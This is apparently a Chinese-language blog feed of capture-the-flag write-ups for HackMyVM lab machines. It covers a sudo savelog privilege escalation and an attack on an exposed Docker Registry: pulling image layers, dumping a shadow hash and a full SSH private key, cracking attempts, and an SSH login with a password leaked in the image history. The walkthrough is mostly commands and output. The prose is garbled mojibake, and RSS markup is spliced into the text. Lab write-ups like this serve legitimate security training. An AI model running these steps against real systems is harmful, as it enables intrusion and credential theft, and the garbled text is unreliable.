`-x`Êàë‰ª¨ÊØîËæÉÊÑüÂÖ¥Ë∂£ÔºåËØïËØïË°å‰∏çË°å

```bash
mandie@espo:~$ find / -name '*.log' 2&gt;/dev/null
/var/www/html/data/logs/espo-2023-12-04.log
/var/www/html/data/logs/espo-2025-01-08.log
/var/www/html/data/logs/espo-2024-01-24.log
/var/log/alternatives.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/dpkg.log
/var/log/php8.2-fpm.log
/var/lib/mysql/ddl_recovery-backup.log
/var/lib/mysql/ddl_recovery.log
mandie@espo:~$ sudo /usr/bin/savelog -x bash /var/log/nginx/access.log
sudo: unable to resolve host espo: Name or service not known
root@espo:/home/mandie# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊàêÂäüÊèêÊùÉ

# 5.ÂêéËØù

Áúã‰∫Ü‰∏Ä‰∏ã`HGBE`Â§ß‰Ω¨ÁöÑwpÔºåÊâçÂèëÁé∞Áæ§‰∏ª`ll104567`ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÆöÊó∂‰ªªÂä°Áõ¥Êé•Ëé∑Âèñ root

![image](https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d)

ÁîöËá≥Âú®`www-data`ÊùÉÈôêÁöÑÊó∂ÂÄôÂ∞±ÂèØ‰ª•Áõ¥Êé•ÊèêÊùÉÂà∞`root`
![C4](https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_espo.html</guid><pubDate>Fri, 27 Jun 2025 09:33:05 +0000</pubDate></item><item><title>hmv_Doll</title><link>https://7r1UMPHK.github.io/post/hmv_Doll.html</link><description># hmv_Doll

# 0.Èó≤ËÅä

![image](assets/image-20250129201949-6vewhf4.png)

**Èù∂Êú∫Ôºö** https://hackmyvm.eu/machines/machine.php?vm=Doll

**Èù∂Êú∫ IPÔºö** 192.168.72.129

**kali IPÔºö** 192.168.72.128

‰ªäÂ§©Âπ¥Âàù‰∫åÔºåÊúâÁÇπÁ©∫ÔºåÊõ¥Êñ∞‰∏Ä‰∏ãwp

# 1.Êâ´Êèè

‚Äã`nmap`‚ÄãÂºÄÊâ´

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
Nmap scan report for 192.168.72.129
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1007/tcp open  unknown
MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
                                                                  
```

ÂÖ∂‰∏≠`1007`‚Äã‰∏çÁü•ÈÅìÊòØ‰ªÄ‰πàÊúçÂä°ÔºåÊàë‰ª¨ËØ¶ÁªÜÊâ´Êèè‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
Nmap scan report for 192.168.72.129
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
1007/tcp open  http    Docker Registry (API: 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds

```

‰∏çÁü•ÈÅìÊòØ‰ªÄ‰πà‰∏úË•øÔºåÊàë‰ª¨Á≠â‰ºöÊêúÁ¥¢‰∏Ä‰∏ã

# 2.Ë∏©ÁÇπ

Âú®**hacktricks**‚Äã‰∏äÊâæÂà∞[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)ËøôÁØáÊñáÁ´†

![image](assets/image-20250129202845-u4dct3k.png)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.72.129:1007/v2/_catalog
{'repositories':['dolly']}
                              
```

ÁªßÁª≠Âà©Áî®

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.72.129:1007/v2/dolly/tags/list
{'name':'dolly','tags':['latest']}
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
{
   'schemaVersion': 1,
   'name': 'dolly',
   'tag': 'latest',
   'architecture': 'amd64',
   'fsLayers': [
      {
         'blobSum': 'sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
      },
      {
         'blobSum': 'sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09'
      }
   ],
   'history': [
      {
         'v1Compatibility': '{\'architecture\':\'amd64\',\'config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'container\':\'10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\',\'container_config\':{\'Hostname\':\'10ddd4608cdf\',\'Domainname\':\'\',\'User\':\'\',\'AttachStdin\':true,\'AttachStdout\':true,\'AttachStderr\':true,\'Tty\':true,\'OpenStdin\':true,\'StdinOnce\':true,\'Env\':[\'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\'],\'Cmd\':[\'/bin/sh\'],\'Image\':\'doll\',\'Volumes\':null,\'WorkingDir\':\'\',\'Entrypoint\':null,\'OnBuild\':null,\'Labels\':{}},\'created\':\'2023-04-25T08:58:11.460540528Z\',\'docker_version\':\'23.0.4\',\'id\':\'89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\',\'os\':\'linux\',\'parent\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\'}'
      },
      {
         'v1Compatibility': '{\'id\':\'1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\',\'parent\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'comment\':\'buildkit.dockerfile.v0\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'ARG passwd=devilcollectsit\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\',\'parent\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.45578926Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop)  CMD [\\\'/bin/sh\\\']\']},\'throwaway\':true}'
      },
      {
         'v1Compatibility': '{\'id\':\'cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\',\'created\':\'2023-03-29T18:19:24.348438709Z\',\'container_config\':{\'Cmd\':[\'/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \']}}'
      }
   ],
   'signatures': [
      {
         'header': {
            'jwk': {
               'crv': 'P-256',
               'kid': 'X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS',
               'kty': 'EC',
               'x': 'm6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c',
               'y': 'WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA'
            },
            'alg': 'ES256'
         },
         'signature': 'n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg',
         'protected': 'eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ'
      }
   ]
}                                                                                                                                     

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ mkdir tmp     
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cd tmp 
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ tar -xf blob1.tar
                         
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ls -la
ÊÄªËÆ° 24
drwxrwxr-x 5 kali kali 4096  1Êúà29Êó• 20:32 .
drwxrwxr-x 4 kali kali 4096  1Êúà29Êó• 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1Êúà29Êó• 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023Âπ¥ 4Êúà25Êó• etc
drwxr-xr-x 3 kali kali 4096 2023Âπ¥ 4Êúà25Êó• home
drwx------ 2 kali kali 4096 2023Âπ¥ 4Êúà25Êó• root
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cd etc 
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/etc]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 32
drwxr-xr-x 2 kali kali 4096 2023Âπ¥ 4Êúà25Êó• .
drwxrwxr-x 5 kali kali 4096  1Êúà29Êó• 20:32 ..
-rw-r--r-- 1 kali kali  710 2023Âπ¥ 4Êúà25Êó• group
-rw-r--r-- 1 kali kali  697 2022Âπ¥11Êúà 4Êó• group-
-rw-r--r-- 1 kali kali 1223 2023Âπ¥ 4Êúà25Êó• passwd
-rw-r--r-- 1 kali kali 1223 2023Âπ¥ 4Êúà25Êó• passwd-
-rw-r----- 1 kali kali  553 2023Âπ¥ 4Êúà25Êó• shadow
-rw-r----- 1 kali kali  448 2023Âπ¥ 4Êúà25Êó• shadow-
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/etc]
‚îî‚îÄ$ cat *   
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
bela:x:1000:
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:!:19472:0:99999:7:::
                                 
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/etc]
‚îî‚îÄ$ cd ..                                
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ls la 
ls: Êó†Ê≥ïËÆøÈóÆ 'la': Ê≤°ÊúâÈÇ£‰∏™Êñá‰ª∂ÊàñÁõÆÂΩï
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ls -la
ÊÄªËÆ° 24
drwxrwxr-x 5 kali kali 4096  1Êúà29Êó• 20:32 .
drwxrwxr-x 4 kali kali 4096  1Êúà29Êó• 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1Êúà29Êó• 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023Âπ¥ 4Êúà25Êó• etc
drwxr-xr-x 3 kali kali 4096 2023Âπ¥ 4Êúà25Êó• home
drwx------ 2 kali kali 4096 2023Âπ¥ 4Êúà25Êó• root
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cd home 
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 12
drwxr-xr-x 3 kali kali 4096 2023Âπ¥ 4Êúà25Êó• .
drwxrwxr-x 5 kali kali 4096  1Êúà29Êó• 20:32 ..
drwxr-xr-x 3 kali kali 4096 2023Âπ¥ 4Êúà25Êó• bela
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home]
‚îî‚îÄ$ cd bela 
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home/bela]
‚îî‚îÄ$ l -al 
ÊÄªËÆ° 16
drwxr-xr-x 3 kali kali 4096 2023Âπ¥ 4Êúà25Êó• ./
drwxr-xr-x 3 kali kali 4096 2023Âπ¥ 4Êúà25Êó• ../
-rw------- 1 kali kali   57 2023Âπ¥ 4Êúà25Êó• .ash_history
drwxr-xr-x 2 kali kali 4096 2023Âπ¥ 4Êúà25Êó• .ssh/
-rwxr-xr-x 1 kali kali    0 1969Âπ¥12Êúà31Êó• .wh..wh..opq*
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home/bela]
‚îî‚îÄ$ cat .ash_history                     
pwd
ls -la
mkdir .ssh
cd .ssh
nano id_rsa
vi id_rsa
exit
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home/bela]
‚îî‚îÄ$ cat .wh..wh..opq
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/home/bela]
‚îî‚îÄ$ cd .ssh       
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 12
drwxr-xr-x 2 kali kali 4096 2023Âπ¥ 4Êúà25Êó• .
drwxr-xr-x 3 kali kali 4096 2023Âπ¥ 4Êúà25Êó• ..
-rw-r--r-- 1 kali kali 2635 2023Âπ¥ 4Êúà25Êó• id_rsa
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ cat id_rsa    
-----BEGIN OPENSSH PRIVATE KEY-----
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
VtVwCw==
-----END OPENSSH PRIVATE KEY-----
                                             
```

ÁúÅ‰∫ÜÔºåÈÉΩ‰∏çÁî®ÁàÜÁ†¥shadow‰∫Ü

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ ssh2john id_rsa &gt; hash
                                         
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan

```

ÁàÜÁ†¥‰∏çÂá∫Êù•Ôºå‰∏ç‰ºöÊòØÁî®Ëøô‰∏™Âêß

![image](assets/image-20250129204242-qkg0s6r.png)

ËØïËØï

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ chmod 600 id_rsa 

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ ssh bela@192.168.72.129 -i id_rsa
ssh: connect to host 192.168.72.129 port 22: No route to host
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/tmp/home/bela/.ssh]
‚îî‚îÄ$ ssh bela@192.168.72.129 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
bela@doll:~$ id
uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.ÊèêÊùÉ

```
bela@doll:~$ sudo -l
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337

```

